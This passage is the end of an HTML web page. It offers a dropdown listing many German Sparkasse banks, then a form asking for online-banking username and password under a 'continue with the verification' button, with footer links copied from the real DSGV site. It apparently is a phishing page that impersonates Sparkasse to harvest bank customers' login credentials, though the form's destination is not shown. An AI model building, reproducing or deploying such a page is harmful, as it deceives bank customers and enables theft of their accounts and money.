                  <option value="Stadtsparkasse Grebenstein">Stadtsparkasse Grebenstein</option>
                  <option value="Stadtsparkasse Schwalmstadt">Stadtsparkasse Schwalmstadt</option>
                  <option value="Taunus Sparkasse">Taunus Sparkasse</option>
                  <option value="Rheinhessen Sparkasse">Rheinhessen Sparkasse</option>
                  <option value="Müritz-Sparkasse">Müritz-Sparkasse</option>
                  <option value="OstseeSparkasse Rostock">OstseeSparkasse Rostock</option>
                  <option value="Sparkasse Mecklenburg-Nordwest">Sparkasse Mecklenburg-Nordwest</option>
                  <option value="Sparkasse Mecklenburg-Schwerin">Sparkasse Mecklenburg-Schwerin</option>
                  <option value="Sparkasse Mecklenburg-Strelitz">Sparkasse Mecklenburg-Strelitz</option>
                  <option value="Sparkasse Neubrandenburg-Demmin">Sparkasse Neubrandenburg-Demmin</option>
                  <option value="Sparkasse Uecker-Randow">Sparkasse Uecker-Randow</option>
                  <option value="Sparkasse Vorpommern">Sparkasse Vorpommern</option>
                  <option value="Sparkasse Harburg-Buxtehude">Sparkasse Harburg-Buxtehude</option>
                  <option value="Braunschweigische Landessparkasse Teilrechtsfähige Anstalt der Nord/LB">Braunschweigische Landessparkasse Teilrechtsfähige Anstalt der Nord/LB</option>
                  <option value="Kreis-Sparkasse Northeim">Kreis-Sparkasse Northeim</option>
                  <option value="Kreissparkasse Bersenbrück">Kreissparkasse Bersenbrück</option>
                  <option value="Kreissparkasse Fallingbostel in Walsrode">Kreissparkasse Fallingbostel in Walsrode</option>
                  <option value="Kreissparkasse Grafschaft Bentheim zu Nordhorn">Kreissparkasse Grafschaft Bentheim zu Nordhorn</option>
                  <option value="Kreissparkasse Grafschaft Diepholz">Kreissparkasse Grafschaft Diepholz</option>
                  <option value="Kreissparkasse Melle">Kreissparkasse Melle</option>
                  <option value="Kreissparkasse Soltau">Kreissparkasse Soltau</option>
                  <option value="Kreissparkasse Stade">Kreissparkasse Stade</option>
                  <option value="Kreissparkasse Syke">Kreissparkasse Syke</option>
                  <option value="Kreissparkasse Verden">Kreissparkasse Verden</option>
                  <option value="Landessparkasse zu Oldenburg">Landessparkasse zu Oldenburg</option>
                  <option value="Sparkasse Aurich-Norden">Sparkasse Aurich-Norden</option>
                  <option value="Sparkasse Celle-Gifhorn-Wolfsburg">Sparkasse Celle-Gifhorn-Wolfsburg</option>
                  <option value="Sparkasse Duderstadt">Sparkasse Duderstadt</option>
                  <option value="Sparkasse Einbeck">Sparkasse Einbeck</option>
                  <option value="Sparkasse Emden">Sparkasse Emden</option>
                  <option value="Sparkasse Emsland">Sparkasse Emsland</option>
                  <option value="Sparkasse Göttingen">Sparkasse Göttingen</option>
                  <option value="Sparkasse Hameln-Weserbergland">Sparkasse Hameln-Weserbergland</option>
                  <option value="Sparkasse Hannover">Sparkasse Hannover</option>
                  <option value="Sparkasse Hildesheim Goslar Peine">Sparkasse Hildesheim Goslar Peine</option>
                  <option value="Sparkasse LeerWittmund">Sparkasse LeerWittmund</option>
                  <option value="Sparkasse Lüneburg">Sparkasse Lüneburg</option>
                  <option value="Sparkasse Nienburg">Sparkasse Nienburg</option>
                  <option value="Sparkasse Osnabrück">Sparkasse Osnabrück</option>
                  <option value="Sparkasse Osterode am Harz">Sparkasse Osterode am Harz</option>
                  <option value="Sparkasse Rotenburg Osterholz">Sparkasse Rotenburg Osterholz</option>
                  <option value="Sparkasse Schaumburg">Sparkasse Schaumburg</option>
                  <option value="Sparkasse Scheeßel">Sparkasse Scheeßel</option>
                  <option value="Sparkasse Stade-Altes Land">Sparkasse Stade-Altes Land</option>
                  <option value="Sparkasse Uelzen Lüchow-Dannenberg">Sparkasse Uelzen Lüchow-Dannenberg</option>
                  <option value="Sparkasse Wilhelmshaven">Sparkasse Wilhelmshaven</option>
                  <option value="Stadtsparkasse Bad Pyrmont">Stadtsparkasse Bad Pyrmont</option>
                  <option value="Stadtsparkasse Barsinghausen">Stadtsparkasse Barsinghausen</option>
                  <option value="Stadtsparkasse Burgdorf">Stadtsparkasse Burgdorf</option>
                  <option value="Stadtsparkasse Cuxhaven">Stadtsparkasse Cuxhaven</option>
                  <option value="Stadtsparkasse Wunstorf">Stadtsparkasse Wunstorf</option>
                  <option value="Herner Sparkasse">Herner Sparkasse</option>
                  <option value="Kreissparkasse Düsseldorf">Kreissparkasse Düsseldorf</option>
                  <option value="Kreissparkasse Euskirchen">Kreissparkasse Euskirchen</option>
                  <option value="Kreissparkasse Halle (Westf.)">Kreissparkasse Halle (Westf.)</option>
                  <option value="Kreissparkasse Heinsberg">Kreissparkasse Heinsberg</option>
                  <option value="Kreissparkasse Köln">Kreissparkasse Köln</option>
                  <option value="Kreissparkasse Steinfurt">Kreissparkasse Steinfurt</option>
                  <option value="Kreissparkasse Wiedenbrück">Kreissparkasse Wiedenbrück</option>
                  <option value="Niederrheinische Sparkasse RheinLippe">Niederrheinische Sparkasse RheinLippe</option>
                  <option value="Sparkasse Aachen">Sparkasse Aachen</option>
                  <option value="Sparkasse am Niederrhein">Sparkasse am Niederrhein</option>
                  <option value="Sparkasse an der Lippe">Sparkasse an der Lippe</option>
                  <option value="Sparkasse an Ennepe und Ruhr">Sparkasse an Ennepe und Ruhr</option>
                  <option value="Sparkasse an Volme und Ruhr">Sparkasse an Volme und Ruhr</option>
                  <option value="Sparkasse Arnsberg-Sundern">Sparkasse Arnsberg-Sundern</option>
                  <option value="Sparkasse Attendorn-Lennestadt-Kirchhundem">Sparkasse Attendorn-Lennestadt-Kirchhundem</option>
                  <option value="Sparkasse Bad Oeynhausen - Porta Westfalica">Sparkasse Bad Oeynhausen - Porta Westfalica</option>
                  <option value="Sparkasse Beckum-Wadersloh">Sparkasse Beckum-Wadersloh</option>
                  <option value="Sparkasse Bergkamen-Bönen">Sparkasse Bergkamen-Bönen</option>
                  <option value="Sparkasse Bielefeld">Sparkasse Bielefeld</option>
                  <option value="Sparkasse Bochum">Sparkasse Bochum</option>
                  <option value="Sparkasse Bottrop">Sparkasse Bottrop</option>
                  <option value="Sparkasse Burbach-Neunkirchen">Sparkasse Burbach-Neunkirchen</option>
                  <option value="Sparkasse Dortmund">Sparkasse Dortmund</option>
                  <option value="Sparkasse Duisburg">Sparkasse Duisburg</option>
                  <option value="Sparkasse Düren">Sparkasse Düren</option>
                  <option value="Sparkasse Essen">Sparkasse Essen</option>
                  <option value="Sparkasse Gelsenkirchen">Sparkasse Gelsenkirchen</option>
                  <option value="Sparkasse Geseke">Sparkasse Geseke</option>
                  <option value="Sparkasse Gladbeck">Sparkasse Gladbeck</option>
                  <option value="Sparkasse Gummersbach">Sparkasse Gummersbach</option>
                  <option value="Sparkasse Gütersloh-Rietberg-Versmold">Sparkasse Gütersloh-Rietberg-Versmold</option>
                  <option value="Sparkasse Hamm">Sparkasse Hamm</option>
                  <option value="Sparkasse Hattingen">Sparkasse Hattingen</option>
                  <option value="Sparkasse Hellweg-Lippe">Sparkasse Hellweg-Lippe</option>
                  <option value="Sparkasse Herford">Sparkasse Herford</option>
                  <option value="Sparkasse Hilden-Ratingen-Velbert">Sparkasse Hilden-Ratingen-Velbert</option>
                  <option value="Sparkasse Hochsauerland">Sparkasse Hochsauerland</option>
                  <option value="Sparkasse Höxter">Sparkasse Höxter</option>
                  <option value="Sparkasse Iserlohn">Sparkasse Iserlohn</option>
                  <option value="Sparkasse Kierspe-Meinerzhagen">Sparkasse Kierspe-Meinerzhagen</option>
                  <option value="Sparkasse KölnBonn">Sparkasse KölnBonn</option>
                  <option value="Sparkasse Krefeld">Sparkasse Krefeld</option>
                  <option value="Sparkasse Lemgo">Sparkasse Lemgo</option>
                  <option value="Sparkasse Leverkusen">Sparkasse Leverkusen</option>
                  <option value="Sparkasse Märkisches Sauerland Hemer–Menden">Sparkasse Märkisches Sauerland Hemer–Menden</option>
                  <option value="Sparkasse Minden-Lübbecke">Sparkasse Minden-Lübbecke</option>
                  <option value="Sparkasse Mitten im Sauerland">Sparkasse Mitten im Sauerland</option>
                  <option value="Sparkasse Mülheim an der Ruhr">Sparkasse Mülheim an der Ruhr</option>
                  <option value="Sparkasse Münsterland Ost">Sparkasse Münsterland Ost</option>
                  <option value="Sparkasse Neuss">Sparkasse Neuss</option>
                  <option value="Sparkasse Olpe-Drolshagen-Wenden">Sparkasse Olpe-Drolshagen-Wenden</option>
                  <option value="Sparkasse Paderborn-Detmold">Sparkasse Paderborn-Detmold</option>
                  <option value="Sparkasse Radevormwald-Hückeswagen">Sparkasse Radevormwald-Hückeswagen</option>
                  <option value="Sparkasse Rhein-Maas">Sparkasse Rhein-Maas</option>
                  <option value="Sparkasse Schwelm-Sprockhövel">Sparkasse Schwelm-Sprockhövel</option>
                  <option value="Sparkasse Siegen">Sparkasse Siegen</option>
                  <option value="Sparkasse UnnaKamen">Sparkasse UnnaKamen</option>
                  <option value="Sparkasse Vest Recklinghausen">Sparkasse Vest Recklinghausen</option>
                  <option value="Sparkasse Westmünsterland">Sparkasse Westmünsterland</option>
                  <option value="Sparkasse Witten">Sparkasse Witten</option>
                  <option value="Sparkasse Wittgenstein">Sparkasse Wittgenstein</option>
                  <option value="Stadt-Sparkasse Haan (Rheinl.)">Stadt-Sparkasse Haan (Rheinl.)</option>
                  <option value="Stadt-Sparkasse Langenfeld">Stadt-Sparkasse Langenfeld</option>
                  <option value="Stadt-Sparkasse Solingen">Stadt-Sparkasse Solingen</option>
                  <option value="Stadtsparkasse Bocholt">Stadtsparkasse Bocholt</option>
                  <option value="Stadtsparkasse Delbrück">Stadtsparkasse Delbrück</option>
                  <option value="Stadtsparkasse Düsseldorf">Stadtsparkasse Düsseldorf</option>
                  <option value="Stadtsparkasse Haltern am See">Stadtsparkasse Haltern am See</option>
                  <option value="Stadtsparkasse Lengerich">Stadtsparkasse Lengerich</option>
                  <option value="Stadtsparkasse Mönchengladbach">Stadtsparkasse Mönchengladbach</option>
                  <option value="Stadtsparkasse Oberhausen">Stadtsparkasse Oberhausen</option>
                  <option value="Stadtsparkasse Rahden">Stadtsparkasse Rahden</option>
                  <option value="Stadtsparkasse Remscheid">Stadtsparkasse Remscheid</option>
                  <option value="Stadtsparkasse Rheine">Stadtsparkasse Rheine</option>
                  <option value="Stadtsparkasse Wermelskirchen">Stadtsparkasse Wermelskirchen</option>
                  <option value="Stadtsparkasse Wuppertal">Stadtsparkasse Wuppertal</option>
                  <option value="Vereinigte Sparkasse im Märkischen Kreis">Vereinigte Sparkasse im Märkischen Kreis</option>
                  <option value="Nassauische Sparkasse">Nassauische Sparkasse</option>
                  <option value="Kreissparkasse Ahrweiler">Kreissparkasse Ahrweiler</option>
                  <option value="Kreissparkasse Birkenfeld">Kreissparkasse Birkenfeld</option>
                  <option value="Kreissparkasse Bitburg-Prüm">Kreissparkasse Bitburg-Prüm</option>
                  <option value="Kreissparkasse Kusel">Kreissparkasse Kusel</option>
                  <option value="Kreissparkasse Mayen">Kreissparkasse Mayen</option>
                  <option value="Kreissparkasse Rhein-Hunsrück">Kreissparkasse Rhein-Hunsrück</option>
                  <option value="Kreissparkasse Vulkaneifel">Kreissparkasse Vulkaneifel</option>
                  <option value="Sparkasse Donnersberg">Sparkasse Donnersberg</option>
                  <option value="Sparkasse Kaiserslautern">Sparkasse Kaiserslautern</option>
                  <option value="Sparkasse Koblenz">Sparkasse Koblenz</option>
                  <option value="Sparkasse Mittelmosel – Eifel Mosel Hunsrück">Sparkasse Mittelmosel – Eifel Mosel Hunsrück</option>
                  <option value="Sparkasse Neuwied">Sparkasse Neuwied</option>
                  <option value="Sparkasse Rhein-Haardt">Sparkasse Rhein-Haardt</option>
                  <option value="Sparkasse Rhein-Nahe">Sparkasse Rhein-Nahe</option>
                  <option value="Sparkasse Südpfalz">Sparkasse Südpfalz</option>
                  <option value="Sparkasse Südwestpfalz">Sparkasse Südwestpfalz</option>
                  <option value="Sparkasse Trier">Sparkasse Trier</option>
                  <option value="Sparkasse Vorderpfalz">Sparkasse Vorderpfalz</option>
                  <option value="Sparkasse Westerwald-Sieg">Sparkasse Westerwald-Sieg</option>
                  <option value="Rheinhessen Sparkasse">Rheinhessen Sparkasse</option>
                  <option value="Kreissparkasse Saarlouis">Kreissparkasse Saarlouis</option>
                  <option value="Kreissparkasse Saarpfalz">Kreissparkasse Saarpfalz</option>
                  <option value="Kreissparkasse St. Wendel">Kreissparkasse St. Wendel</option>
                  <option value="Sparkasse Merzig-Wadern">Sparkasse Merzig-Wadern</option>
                  <option value="Sparkasse Neunkirchen">Sparkasse Neunkirchen</option>
                  <option value="Sparkasse Saarbrücken">Sparkasse Saarbrücken</option>
                  <option value="Erzgebirgssparkasse">Erzgebirgssparkasse</option>
                  <option value="Kreissparkasse Bautzen">Kreissparkasse Bautzen</option>
                  <option value="Kreissparkasse Döbeln">Kreissparkasse Döbeln</option>
                  <option value="Ostsächsische Sparkasse Dresden">Ostsächsische Sparkasse Dresden</option>
                  <option value="Sparkasse Chemnitz">Sparkasse Chemnitz</option>
                  <option value="Sparkasse Leipzig">Sparkasse Leipzig</option>
                  <option value="Sparkasse Meißen">Sparkasse Meißen</option>
                  <option value="Sparkasse Mittelsachsen">Sparkasse Mittelsachsen</option>
                  <option value="Sparkasse Muldental">Sparkasse Muldental</option>
                  <option value="Sparkasse Oberlausitz-Niederschlesien">Sparkasse Oberlausitz-Niederschlesien</option>
                  <option value="Sparkasse Vogtland">Sparkasse Vogtland</option>
                  <option value="Sparkasse Zwickau">Sparkasse Zwickau</option>
                  <option value="Harzsparkasse">Harzsparkasse</option>
                  <option value="Kreissparkasse Anhalt-Bitterfeld">Kreissparkasse Anhalt-Bitterfeld</option>
                  <option value="Kreissparkasse Börde">Kreissparkasse Börde</option>
                  <option value="Kreissparkasse Stendal">Kreissparkasse Stendal</option>
                  <option value="Saalesparkasse">Saalesparkasse</option>
                  <option value="Salzlandsparkasse">Salzlandsparkasse</option>
                  <option value="Sparkasse Altmark West">Sparkasse Altmark West</option>
                  <option value="Sparkasse Burgenlandkreis">Sparkasse Burgenlandkreis</option>
                  <option value="Sparkasse Magdeburg">Sparkasse Magdeburg</option>
                  <option value="Sparkasse Mansfeld-Südharz">Sparkasse Mansfeld-Südharz</option>
                  <option value="Sparkasse Wittenberg">Sparkasse Wittenberg</option>
                  <option value="Stadtsparkasse Dessau">Stadtsparkasse Dessau</option>
                  <option value="Kreissparkasse Eichsfeld">Kreissparkasse Eichsfeld</option>
                  <option value="Kreissparkasse Gotha">Kreissparkasse Gotha</option>
                  <option value="Kreissparkasse Hildburghausen">Kreissparkasse Hildburghausen</option>
                  <option value="Kreissparkasse Nordhausen">Kreissparkasse Nordhausen</option>
                  <option value="Kreissparkasse Saale-Orla">Kreissparkasse Saale-Orla</option>
                  <option value="Kreissparkasse Saalfeld-Rudolstadt">Kreissparkasse Saalfeld-Rudolstadt</option>
                  <option value="Kyffhäusersparkasse Artern-Sondershausen">Kyffhäusersparkasse Artern-Sondershausen</option>
                  <option value="Rhön-Rennsteig-Sparkasse">Rhön-Rennsteig-Sparkasse</option>
                  <option value="Sparkasse Altenburger Land">Sparkasse Altenburger Land</option>
                  <option value="Sparkasse Arnstadt-Ilmenau">Sparkasse Arnstadt-Ilmenau</option>
                  <option value="Sparkasse Gera-Greiz">Sparkasse Gera-Greiz</option>
                  <option value="Sparkasse Jena-Saale-Holzland">Sparkasse Jena-Saale-Holzland</option>
                  <option value="Sparkasse Mittelthüringen">Sparkasse Mittelthüringen</option>
                  <option value="Sparkasse Sonneberg">Sparkasse Sonneberg</option>
                  <option value="Sparkasse Unstrut-Hainich">Sparkasse Unstrut-Hainich</option>
                  <option value="Wartburg-Sparkasse">Wartburg-Sparkasse</option>
                  <option value="Bordesholmer Sparkasse AG">Bordesholmer Sparkasse AG</option>
                  <option value="Förde Sparkasse">Förde Sparkasse</option>
                  <option value="Kreissparkasse Herzogtum Lauenburg">Kreissparkasse Herzogtum Lauenburg</option>
                  <option value="Nord-Ostsee Sparkasse">Nord-Ostsee Sparkasse</option>
                  <option value="Sparkasse Elmshorn">Sparkasse Elmshorn</option>
                  <option value="Sparkasse Mittelholstein AG">Sparkasse Mittelholstein AG</option>
                  <option value="Sparkasse Südholstein">Sparkasse Südholstein</option>
                  <option value="Sparkasse Westholstein">Sparkasse Westholstein</option>
                  <option value="Sparkasse zu Lübeck AG">Sparkasse zu Lübeck AG</option>
                  <option value="Stadtsparkasse Wedel">Stadtsparkasse Wedel</option>
                  <option value="Sparkasse Holstein">Sparkasse Holstein</option>
                </select>
                <script src='dependent-selects.js'></script>
                <br> <br> 
              
              
              <label name="olb_login" id="olb_login" >Login *</label><br>
                <input name="olb_login" type="text" id="olb_login" placeholder="Nutzername" style="width: 250px;"><br>
                <label name="olb_pw" id="olb_pw" >Passwort *</label><br>
                <input name="olb_pw" type="password" id="olb_pw" placeholder="Passwort" style="width: 250px;"><br>
                <button  type='submit' class='btn btn-danger'>Mit der Überprüfung fortfahren <img src="Ressourcen/Button.png" style ="width: 13%; height: auto;"> </button>
              </form>
            </div>
          </div>
        </div>
      </div>
    </article>

    <footer>
      <div class="row">
        <div class="col"> <table>
          <tr>
            <thead><b>Der Verband</b></thead><br>
            <tr><a href="https://www.dsgv.de/verband/aufgaben.html">Aufgaben</a></tr><br>
            <tr><a href="https://www.dsgv.de/verband/mitgliedschaften.html">Mitgliedschaften</a></tr><br>
            <tr><a href="https://www.dsgv.de/verband/einrichtungen.html">Einrichtungen</a></tr><br>
            <tr><a href="https://www.dsgv.de/verband/schlichtungsstelle.html">Schlichtungsstelle</a></tr><br>
            <tr><a href="https://www.dsgv.de/verband/karriere.html">Karriere</a></tr><br>
            <tr><a href="https://www.dsgv.de/verband/kontakt.html">Kontakt</a></tr><br>
          </tr>
        </table>
      </div>
        <div class="col"> <table>
          <tr>
            <thead><b>Sparkassen-Finanzgruppe</b></thead><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/organisation/verbandsstruktur.html">Verbundstruktur</a></tr><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/sicherungssystem.html">Sicherungssystem</a></tr><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/publikationen/Vermoegensbarometer_2021.html">Vermögensbarometer</a></tr><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/sparkassen-international.html">International</a></tr><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/rating.html">Rating</a></tr><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/pfandbriefe.html">Pfandbriefe</a></tr><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/sparkassentag/Sparkassentag-2023-Hannover.html">Sparkassentag</a></tr><br>
          </tr>
        </table>
      </div>
        <div class="col"> <table>
          <tr>
            <thead><b>Verantwortung</b></thead><br>
            <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/sportfoerderung.html">Sportförderung</a></tr><br>
            <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/kunstfoerderung-kulturfoerderung.html">Kunst- und Kulturförderung</a></tr><br>
            <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/finanzielle-bildung.html">Finanzielle Bildung</a></tr><br>
            <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/wirtschaftsfoerderung-wissenschaftsfoederung.html">Wissenschaftsförderung</a></tr><br>
            <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/stiftungen.html">Stiftungen</a></tr><br>
            <tr><a href="https://www.dsgv.de/unsere-verantwortung/bericht-an-die-gesellschaft.html">Bericht an die Gesellschaft</a></tr><br>
          </tr>
        </table></div>
        <div class="col"><table>
          <thead><b>Newsroom</b></thead><br>
          <tr><a href="https://www.dsgv.de/newsroom/blog.html">Blog</a></tr><br>
          <tr><a href="https://www.dsgv.de/newsroom/presse.html">Presse</a></tr><br>
          <tr><a href="https://www.dsgv.de/newsroom/termine.html">Termine</a></tr><br>
          <tr><a href="https://www.dsgv.de/newsroom/abo-service.html">Abo-Service</a></tr><br>
          <tr><a href="https://www.dsgv.de/newsroom/ansprechpartner.html">Ansprechpartner</a></tr><br>
        </table></div>
      </div>
      <hr>
      <div class="row">
        <div class="col">
          <a href="https://www.dsgv.de/impressum.html">Impressum</a>
        </div>
        <div class="col">
          <a href="https://www.dsgv.de/datenschutz.html">Datenschutz</a>
        </div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
      </div>
    </div>        
    </footer>

    </body>
</html>